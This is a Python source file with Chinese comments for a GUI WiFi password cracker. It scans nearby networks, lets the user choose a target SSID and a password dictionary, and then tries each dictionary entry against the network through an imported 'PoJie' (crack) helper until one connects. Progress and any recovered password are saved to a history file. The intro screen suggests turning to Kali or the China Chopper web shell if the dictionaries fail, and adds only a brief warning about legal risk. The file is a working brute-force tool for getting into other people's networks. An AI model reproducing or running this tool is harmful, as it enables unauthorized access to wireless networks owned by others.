#2020.1.19  v1.0
#2020.2.24 16:07
import tkinter
import pywifi
import wifi
import sc
import time
import ctypes 
import threading
import scfp
import json
import hashlib
import os
import tkinter.filedialog

import tkinter as tk

from tkinter import ttk
from tkinter import messagebox

class Crack_interface():
    dic_file_b = None     #字典路径
    wifi_name = None    #wifi名称
    wifi_strength = []  #wifi信号强度
    n = 0           #进度条绘制了多少
    start_sleep = -1    #-1为未破解 1正在破解 0暂停破解 2为找到密码 -2为可再选字典 -3可在选wifi
    progress_bar = 0    #记录进度条走了多少
    h_md5 = None        #历史文件MD5
    tii = 0 

    def start(self):        #启动按钮
        if not self.start_b['text'] == '开始破解':
            self.start_b['text'] = '开始破解'
            self.start_sleep = 0        #破解暂停设为0
            return 0
        else:
            if self.start_sleep == 2:
                messagebox.showinfo('hello','此wifi已跑出密码，请换wifi')
                return
            self.start_b['text'] = '暂停破解'
            if self.start_sleep == 0:       #如果之前已经运行过这个函数
                self.start_sleep = 1
                return 0
            else:       #第一次运行
                if not self.dic_file_b or not self.wifi_name:       #判断是否选择字典和wifi
                    if not self.wifi_name:
                        messagebox.showinfo('hello','请选择wifi')
                    else:
                        messagebox.showinfo('hello','请选择字典')
                    self.start_sleep = -1
                    self.start_b['text'] = '开始破解'
                    return 0
                else:
                    crack = threading.Thread(target=self.Crack_main)  #多线程  启动破解
                    crack.daemon = True     #将线程设置为守护线程
                    crack.start()


                    
    def Crack_main(self):       #破解函数  2020.2.13
        self.scp_i = scfp.cfp(self.count)       #获取如何绘制进度条
        h_row = self.dic_json()                 #获取历史文件
        with open(self.dic_file_b,errors="ignore") as dic_f:
            dic_row = 0     #正在运行字典的位置
            if h_row:
                if h_row >= self.count:     #判断字典是否跑完
                    messagebox.showinfo('hello','此字典已跑完')
                    self.start_b['text'] = '开始破解'
                    self.start_sleep = -2
                    return 0
                dic_row = h_row
                for i in range(h_row):      #使字典到达历史位置
                    dic_f.readline()
            wifi_Handle = wifi.PoJie(ssid=self.wifi_name)       #获取破解实例

            t1 = time.time()
            try:
                #开始破解
                while True:
                    dic_str = dic_f.readline()      #读取一行字典文件
                    
                    if not dic_str:     #如果为空
                        if dic_row >= self.count:       #判断是否跑完字典
                            for i in range(int(100)+1):
                                self.progress()
                                self.progress()
                            messagebox.showinfo('hello','已跑完字典')
                            self.start_b['text'] = '开始破解'
                            self.history_file_Write(dic_row)    #写入历史
                            self.start_sleep = -2
                            return 0
                        else:
                            if not os.path.isfile(self.dic_file_b):
                                messagebox.showinfo('hello','找不到字典,已暂停')
                                self.start_sleep = -1
                                self.start_b['text'] = '开始破解'
                                history_file_Write(dic_row)
                                return 0
                            history_file_Write(dic_row)     #如果其他原因
                            self.start_sleep = -1
                            win.after(0, self.start)        #则重启破解
                            return 0
                            
                    self.lb_pass.config(text=dic_str)       #显示正在破解的密码
                    win.update()
                    try:
                        if wifi_Handle.test_connect(dic_str):       #尝试密码
                            self.success(dic_str)      #破解成功
                            return
                    except wifi.wifiError:      #wifi消失
                        self.lb_sleep.config(text="wifi信号消失，暂停5秒")
                        win.update()
                        wi_sl = 0
                        time.sleep(5)
                        while True:
                            try:
                                if wifi_Handle.test_connect(dic_str):       #尝试密码
                                    self.lb_sleep.config(text=" ")
                                    win.update()
                                    self.success(dic_str)      #破解成功
                                    return
                                else:
                                    self.lb_sleep.config(text=" ")
                                    win.update()
                                    break
                            except wifi.wifiError:      #wifi消失
                                if wi_sl == 0:
                                    dic_row -= 6
                                    self.Dictionary_fallback(dic_f,dic_row)      #回退6个密码
                                wi_sl += 1
                                if wi_sl >= 5:
                                    messagebox.showinfo('hello','wifi消失,暂停破解!')
                                    self.lb_sleep.config(text=" ")
                                    win.update()
                                    self.history_file_Write(dic_row)
                                    self.start_b['text'] = '开始破解'
                                    self.start_sleep = 0        #破解暂停设为0
                                    self.Judge_sleep()
                                else:
                                    time.sleep(5*wi_sl)
                                    #pass
                        
                    self.Judge_sleep()   #判断是否暂停破解
                    dic_row += 1
                    self.lb_Row.config(text=str(dic_row)+'/'+str(self.count))
                    win.update()        #更新行数
                    if self.scp_i[0]:
                        if dic_row % (self.scp_i[1]/2) == 0:
                            self.progress()
                    else:
                        for i in range(self.scp_i[1]):
                            self.progress()      #绘制进度条
                            
                    if dic_row % 10 == 0:
                        self.history_file_Write(dic_row)     #写入历史文件
                    try:
                        if t2:pass
                    except NameError:       #没有计算倒计时则获取
                        t2 = time.time() - t1
                        self.h,self.m,self.s = self.start_time(t2 * self.count)    #获得破解时间
                        win.after(1000,self.Countdown)      #开始倒计时
            except RuntimeError:
                if not tk_run:
                    self.history_file_Write(dic_row)     #写入历史文件
                    return

    def success(self,s_str):      #成功
        with open('history.json','a+',encoding='utf-8') as f:
            f.seek(0, 0)
            try:
                hf = json.load(f)   #读取历史文件
            except json.decoder.JSONDecodeError:
                hf = {}     #如果文件不存在则创建新字典        
            if not self.wifi_name in hf:    #判断wifi键是否存在
                hf = {"password_success_cqx_2.14":s_str}
            else:
                hf[self.wifi_name] = {"password_success_cqx_2.14":s_str}    #将密码写入历史
            json.dump(hf,f)     #写入文件
            
        for i in range(int(100)+1):
            self.progress()
            self.progress()
        self.start_sleep = 2
        self.m = self.h = self.s = 0
        self.start_b['text'] = '开始破解'
        messagebox.showinfo('破解成功','密码:'+s_str)


    def Dictionary_fallback(self,f,row):
        f.seek(0,0)
        for i in range(row):
            f.readline()
            

    def Countdown(self):    #绘制倒计时
        if self.start_sleep == 0:
            win.after(20, self.Countdown)
            return 0
        else:pass
        if self.m == 0 and self.s == 0:
            if self.h == 0:pass
            else:
                self.h -= 1
                self.m = 60
        if self.s == 0:
            if self.m == 0: return      #当计时完毕时退出
            else:
                self.m -= 1
                self.s = 60
        if not self.s == 0:
            self.s -= 1
         
        
        tx = str(self.h)+':'+str(self.m)+':'+str(self.s)
        self.lb_t.config(text=tx)
        win.update()
        win.after(1000, self.Countdown)
    
                            
    def start_time(self,time):  #将秒转换成小时
        m = int(time / 60)      #秒除以60等于分钟
        h = int(m / 60)         #分钟除以60等于小时
        m = m % 60         #求余等于剩余分钟
        s = int(time % 60)      #求余等于剩余秒
        return [h,m,s]
                                    
                            

    def Judge_sleep(self):      #判断是否暂停破解  会导致单线程程序死锁
        if self.start_b['text'] == '开始破解':
            while True:
                time.sleep(200)
                if self.start_b['text'] == '暂停破解':
                    break
                    
    def history_file_Write(self,rows,password=None):       #写入历史文件
        if self.h_f == 0:return     #判断是否写入历史文件
        x = '/'
        with open('history.json','a+',encoding='utf-8') as f:
            f.seek(0, 0)
            try:
                hf = json.load(f)   #读取历史文件
            except json.decoder.JSONDecodeError:
                hf = {}     #如果文件不存在则创建新字典
            f.seek(0, 0)
            f.truncate()    #清空文件
            if not self.h_md5:    #判断变量是否为空
                self.h_md5 = self.md5_file()
            if not self.wifi_name in hf:    #判断wifi键是否存在
                hf[self.wifi_name] = {self.dic_file_b[::-1].split(x,1)[0][::-1]:[rows,self.h_md5]}  #将字典行数和MD5存入字典
            else:
                hf[self.wifi_name][self.dic_file_b[::-1].split(x,1)[0][::-1]] = [rows,self.h_md5]      #创建新的字典
 
            json.dump(hf,f)     #写入文件
                

    def dic_json(self):     #读取历史文件
        if not os.path.isfile('history.json'):
            return None     #如果文件不存在则返回空
        with open('history.json','a+',encoding='utf-8') as f:
            f.seek(0, 0)        #读文件前先把文件指针指向首位
            try:
                h = json.load(f)
            except json.decoder.JSONDecodeError:    #如果文件异常
                f.truncate()    #清空文件
                return None
            if "password_success_cqx_2.14" in h:
                messagebox.showinfo('hi','此wifi已跑出密码:'+str(h["password_success_cqx_2.14"]))
            if self.wifi_name in h:      #判断该wifi是否之前跑过
                h_wifi = h[self.wifi_name]
                if self.dic_file_b[::-1].split('/',1)[0][::-1] in h_wifi:        #判断现在字典是否跑过 并获取进度
                    dic = h_wifi[self.dic_file_b[::-1].split('/',1)[0][::-1]]
                    if self.md5_file() == dic[1]:        #判断字典是否被修改过
                        return dic[0]
            return None
                    
    def md5_file(self):     #计算文件MD5
        with open(self.dic_file_b,'rb') as f:
            md5_a = hashlib.md5()
            while True:
                data = f.read(4096)
                if data:
                    md5_a.update(data)
                else:
                    break
        return md5_a.hexdigest()    

    def dic_file(self): #选择字典文件
        if not self.dic_file_b or self.start_sleep == -2:
            fileName =tkinter.filedialog.askopenfilename()
            if fileName:
                self.dic_file_b = fileName

                #获取文件行数
                self.count = 0
                f = open(fileName, 'r', errors="ignore")
                for self.count, line in enumerate(f):pass       
                self.count += 1     #文件行数
                #刷新文件行数
                self.lb_Row.config(text='0/'+str(self.count))
                self.text_x.config(text=fileName)
                win.update()
                f.close()
                self.h_md5 = None       #防止历史文件写入错误 每次切换字典应该置空
                

    # 绘制进度
    def progress(self):
        # 填充进度条
        self.n += 2 #每次增加0.5%
        self.canvas_p.coords(self.fill_line, (0, 0, self.n, 20))     #移动对象
        win.update()     #更新画布
        
    def Countdown_m(self):        #倒计时 已弃用
        if self.m == 0 and self.s == 0:
            if self.h == 0:pass
            else:
                self.h -= 1
                self.m = 60
        if self.s == 0:
            if self.m == 0:
                pass
            else:
                self.m -= 1
                self.s = 60
        if not self.s == 0:
            self.s -= 1
        
        tx = '预计还剩: '+str(self.h)+':'+str(self.m)+':'+str(self.s)
        self.lb_t.config(text=tx)
        win.update()
        win.after(1000, Countdown)

    def history(self,n):      #单选框 是否保存历史记录以及是否播放音乐
        if n == 0:
            if self.h_f == 0:
                self.h_f = 1
            else:self.h_f = 0
        else:
            if self.music == 0:
                self.music = 1
            else:self.music = 0

    def draw(self):         #破解界面
        self.sepa = tkinter.Frame(height=40,bg='white')         #填充
        self.sepa.grid(row=2,column=1)
        self.dic = tkinter.Button(win,text='选择字典',command=lambda :self.dic_file())      #选择字典
        self.dic.grid(row=3,column=1,sticky='W',padx=60)
        
        self.text_x = tk.Label(win,bg='white')      #显示字典路径
        self.text_x.grid(row=3,column=2)

        tk.Label(win, text='进度:', bg='white' ).place(x=10, y=130)
        self.canvas_p = tk.Canvas(win, width=400, height=20, bg="white")
        self.canvas_p.place(x=41, y=130)
        self.fill_line = self.canvas_p.create_rectangle(1, 1, 0, 20, width=0, fill="green")     #画一个绿色矩形

        self.lb_t = tk.Label(win,text='预计还剩: '+str(00)+':'+str(00)+':'+str(00),bg='white')  #倒计时
        self.lb_t.place(x=40, y=160)

        self.lb_Row = tk.Label(win,text='0/0',bg='white')       #字典行数
        self.lb_Row.place(x=135,y=160)

        self.lb_xh = tk.Label(win,text='信号强度:0',bg='white')     #信号强度
        self.lb_xh.place(x=255,y=160)

        self.lb_sleep = tk.Label(win,bg='white')
        self.lb_sleep.place(x=350,y=160)       #可能暂停

        self.lb_pass = tk.Label(win,text='正在尝试:',bg='white')    #正在尝试的密码
        self.lb_pass.place(x = 60,y = 225)

        self.cbn = tk.Checkbutton(win,text='是否保存历史记录（建议最好选上，程序未经过严格的debug，可能存在一些bug）',command=lambda:self.history(0),bg='white')      #历史单选框
        self.cbn.place(x = 35,y = 250)
        self.h_f = 0

        self.cbn_m = tk.Checkbutton(win,text='成功是否播放音乐',command=lambda:self.history(1),bg='white')      #音乐单选框
        self.cbn_m.place(x = 35,y = 280)
        self.music = 0
        
        self.start_b = tk.Button(win,text='开始破解', width=32, height=2, command=lambda:self.start())      #开始按钮
        self.start_b.place(x=130, y=400)

class Query_interface():
    def __init__(self,Crack):
        self.Crack = Crack

    def update(self,idx): # 定时器函数
        global after_Quote
        frame = frames[idx]
        idx += 1 # 下一帧的序号
        label_gif.configure(image=frame) # 显示当前帧的图片
        after_Quote = win.after(100, self.update, idx%numIdx) # 0.1秒(100毫秒)之后继续执行定时器函数(update)  idx%numIdx 当值满了会回到0

    def show_msg(self,*arg,play):       #选择wifi 并输出信号强度
        if self.Crack.wifi_name and self.Crack.start_sleep != 2:
            messagebox.showinfo('hello','请勿重复选择wifi')
        else:
            self.Crack.start_sleep = -2
            messagebox.showinfo('hello',play.get())
            self.Crack.wifi_name = play.get()
            i = self.r.index(self.Crack.wifi_name)
            self.Crack.lb_xh.config(text = '信号强度:'+str(self.Crack.wifi_strength[i]))
            win.update()

    def scann(self):        #绘制等待图案以及扫描wifi
        sepa = tkinter.Frame(height=190)
        sepa.grid(row=0)

        # 填充24 帧内容到frames
        global frames,label_gif,after_Quote
        frames = [tk.PhotoImage(file='加载.gif', format='gif -index %i' %(i)) for i in range(numIdx)]

        label_gif = tk.Label(win)
        
        k = ' '
        for i in range(55):
            k = k+' '
        text_c = tk.Label(win, bg='white', text=k+'正在扫描')
        text_c.grid(row=1, column=1)
        label_gif.grid(row=1, column=2)
        after_Quote = win.after(0, self.update, 0)
        
        #扫描wifi
        wifi_e = pywifi.PyWiFi()
        wifi = wifi_e.interfaces()[0]
        wifi.scan()
        time.sleep(3)
        re = wifi.scan_results()

        name = tkinter.StringVar()
        play = ttk.Combobox(win,textvariable=name)

        #破解界面
        self.r = []
        for i in range(len(re)):
            if re[i].ssid: 
                self.r.append(re[i].ssid)
                self.Crack.wifi_strength.append(re[i].signal)
        play['values'] = self.r

        try:
            play.current(0)     #选择第一个
        except tkinter.TclError:        #如果搜索不到wifi
            messagebox.showinfo('hello','未搜索到wifi')
            text_c.destroy()
            sepa.destroy()
            label_gif.destroy()
            win.after_cancel(after_Quote)
            self.Query()
            return 0
            
        play.bind("<<ComboboxSelected>>",lambda event:self.show_msg(play=play))
        text_c.destroy()
        sepa.destroy()
        win.after_cancel(after_Quote)
        label_gif.destroy()
        
        text_v = tk.Label(win, bg='white', text='                                   请选择wifi:')
        text_v.grid(row=0,column=1)
        play.grid(row=0,column=2)
    
        Crack.draw()
        

    def wifi_ap(self,te_b,text_w):

        #清除原来界面内容
        te_b.destroy()
        text_w.destroy()

        sct = threading.Thread(target=self.scann)  #多线程
        sct.start()

    def Query(self):
        dll_ad = ctypes.cdll.LoadLibrary('admin.dll')
        ad_i = dll_ad._Z7Lsadminv()
        if not ad_i:
            messagebox.showinfo('hello','请以管理员权限运行程序，否则程序无法保存之前的wifi密码')
            
        text_w = tk.Label(win, bg='white', text='\n\n理论上，只要你有足够的耐心和一本覆盖到的密码字典，那成功率相当于100%\n但实际情况是，如果你跑完了常用字典还没有成功就应该考虑一下kali或中国菜刀了\n请注意规避法律风险！\n\n\n\n\n\n')
        text_w.pack()

        te_b = tkinter.Button(win,text='扫描wifi',height=2,width=32,command=lambda :self.wifi_ap(te_b,text_w))
        te_b.pack()

        tk.Label(win, text='V1.0(Bate)',bg='white').place(x=215,y=480)

def qu():       #当按下退出时调用这个函数
    try:
        if Crack.start_b['text'] == '暂停破解':
            if messagebox.askyesno(title='是否退出',message='正在尝试，是否退出?'):
                tk_run = False
                win.destroy()
            else:
                return
        else:win.destroy()
    except AttributeError:
        win.destroy()

if __name__ == '__main__':
    tk_run = True
    frames = None #初始化
    label_gif = None
    after_Quote = None  #当label_gif被销毁时，after还在运行，因此就会报错 将after新创建的对象销毁将正常
    numIdx = 24 # gif的帧数
    
    win = tkinter.Tk()
    win.configure(bg='white')
    win.iconbitmap('wifi.ico')
    win.geometry("500x500")
    win.title("wifi遍历")
    win.protocol('WM_DELETE_WINDOW', qu)    #捕获退出事件
    win.resizable(0,0)  #禁止缩放

    Crack = Crack_interface()
    Q = Query_interface(Crack)
    Q.Query()

    win.mainloop()
